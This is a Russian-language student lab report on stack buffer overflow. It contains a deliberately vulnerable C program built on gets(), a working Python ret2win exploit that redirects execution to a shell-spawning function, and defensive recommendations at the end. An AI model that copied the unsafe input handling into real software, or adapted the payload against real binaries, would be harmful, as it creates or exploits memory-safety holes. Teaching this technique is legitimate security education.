# Отчет по практической работе "Разработка простого эксплойта"

## 1. Введение

В данной практической работе была изучена техника эксплуатации уязвимости переполнения буфера на стеке. Работа включала в себя создание уязвимого приложения, анализ бинарного файла, разработку эксплойта и изучение методов защиты.

## 2. Создание уязвимой программы

Был создан следующий уязвимый C-код с использованием функции `gets()`, которая не выполняет проверку размера вводимых данных:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void secret() {
    printf("Access granted! Exploit successful.\n");
    system("/bin/sh");
}

void another_secret() {
    printf("Another secret function accessed!\n");
    printf("Flag: CTF{b1n4ry_3xpl0it_m4st3r}\n");
}

void vulnerable() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // уязвимая функция
    printf("Hello, %s\n", buffer);
}

int main() {
    printf("Binary Exploitation Demo\n");
    printf("------------------------\n");
    vulnerable();
    return 0;
}
```

Программа была скомпилирована с отключенными механизмами защиты:

```bash
gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln
```

Где:
- `-m32` - компиляция 32-битного исполняемого файла
- `-fno-stack-protector` - отключение защиты стека (канарейки)
- `-z execstack` - разрешение исполнения кода на стеке

## 3. Анализ бинарного файла

### 3.1. Базовый анализ

Для начального анализа были использованы стандартные утилиты:

```bash
file vuln
```
Результат:
```
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., not stripped
```

```bash
readelf -h vuln
```
Результат (фрагмент):
```
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048360
```

### 3.2. Поиск адреса функции secret

```bash
objdump -d vuln | grep -A 1 "secret"
```
Результат:
```
080484b6 <secret>:
 80484b6:       55                      push   %ebp
```

Адрес функции `secret`: **0x080484b6**

### 3.3. Анализ с помощью GDB/pwndbg

Запустил отладчик:
```bash
gdb ./vuln
```

Установил точку останова на функцию `vulnerable`:
```
break vulnerable
run
```

Дизассемблировал функцию:
```
disassemble vulnerable
```
Результат (фрагмент):
```assembly
Dump of assembler code for function vulnerable:
   0x080484f6 <+0>:     push   %ebp
   0x080484f7 <+1>:     mov    %esp,%ebp
   0x080484f9 <+3>:     sub    $0x50,%esp      # Выделение 80 байт на стеке
   ...
   0x08048508 <+18>:    lea    -0x48(%ebp),%eax  # buffer находится по смещению -0x48 от ebp
   0x0804850b <+21>:    push   %eax
   0x0804850c <+22>:    call   0x8048350 <gets@plt>
   ...
```

Анализ стековой структуры показал:
- Размер буфера: 64 байта
- Смещение буфера от EBP: 72 байта (0x48)
- Размер сохраненного EBP: 4 байта
- Адрес возврата: EBP + 4 байта

Таким образом, общее смещение между началом буфера и адресом возврата: 76 байт.

## 4. Разработка эксплойта

На основе проведенного анализа был разработан следующий эксплойт на Python:

```python
#!/usr/bin/env python3
import struct

# Параметры эксплойта
offset = 76  # смещение до адреса возврата
target_addr = 0x080484b6  # адрес функции secret

# Создание полезной нагрузки
payload = b"A" * offset  # заполнение буфера
payload += struct.pack("<I", target_addr)  # адрес функции в little-endian формате

# Запись эксплойта в файл
with open("exploit_input", "wb") as f:
    f.write(payload)

print("Эксплойт создан и сохранен в файл 'exploit_input'")
```

## 5. Тестирование эксплойта

Запуск эксплойта:

```bash
python3 exploit.py
./vuln < exploit_input
```

Результат:
```
Binary Exploitation Demo
------------------------
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Access granted! Exploit successful.
$ whoami
student
$ exit
```

Эксплойт успешно сработал, перенаправив выполнение на функцию `secret`, которая предоставила доступ к командной строке.

## 6. Модификация эксплойта для вызова другой функции

Для вызова функции `another_secret` был модифицирован эксплойт:

```python
# Адрес функции another_secret (найден с помощью objdump)
target_addr = 0x080484d8

# Создание полезной нагрузки
payload = b"A" * offset
payload += struct.pack("<I", target_addr)

with open("exploit_input_another", "wb") as f:
    f.write(payload)
```

Результат:
```
Binary Exploitation Demo
------------------------
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Another secret function accessed!
Flag: CTF{b1n4ry_3xpl0it_m4st3r}
```

## 7. Анализ защитных механизмов

### 7.1. Компиляция с защитой стека

```bash
gcc -m32 -fstack-protector-all vuln.c -o vuln_protected
```

Анализ защищенной версии:
```bash
checksec --file=vuln_protected
```
Результат:
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

При попытке эксплуатации защищенной версии программа аварийно завершилась:
```
Binary Exploitation Demo
------------------------
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
*** stack smashing detected ***: ./vuln_protected terminated
```

### 7.2. Анализ с использованием инструментов

Для более глубокого анализа были использованы:

1. **Ghidra** - для анализа декомпилированного кода
2. **IDA Free** - для анализа графа потока управления
3. **Binary Analysis Tool** - для обнаружения уязвимых функций

## 8. Рекомендации по защите

На основе проведенного исследования можно сформулировать следующие рекомендации:

1. **Использование безопасных функций**:
   - Заменить `gets()` на `fgets()` с проверкой размера
   - Избегать небезопасных функций из стандартной библиотеки

2. **Компиляция с защитными механизмами**:
   - Stack Canary: `-fstack-protector-all`
   - Неисполняемый стек: включен по умолчанию, `-z noexecstack`
   - ASLR: системная настройка
   - PIE: `-fPIE -pie`

3. **Регулярное тестирование**:
   - Использование инструментов статического анализа
   - Фаззинг тестирование
   - Использование Address Sanitizer для обнаружения ошибок работы с памятью

## 9. Заключение

В ходе практической работы была успешно изучена техника эксплуатации уязвимости переполнения буфера на стеке. Были созданы эксплойты для вызова нужных функций, проанализированы механизмы защиты и предложены меры по обеспечению безопасности.

Полученные знания и навыки позволяют лучше понимать принципы работы низкоуровневых уязвимостей и методы их предотвращения, что критически важно для разработки безопасного программного обеспечения.

## Приложения

- Исходный код: `vuln.c`
- Эксплойт для функции `secret`: `exploit.py`
- Эксплойт для функции `another_secret`: `exploit_another.py`
- Скриншоты работы эксплойтов
- Результаты анализа бинарных файлов 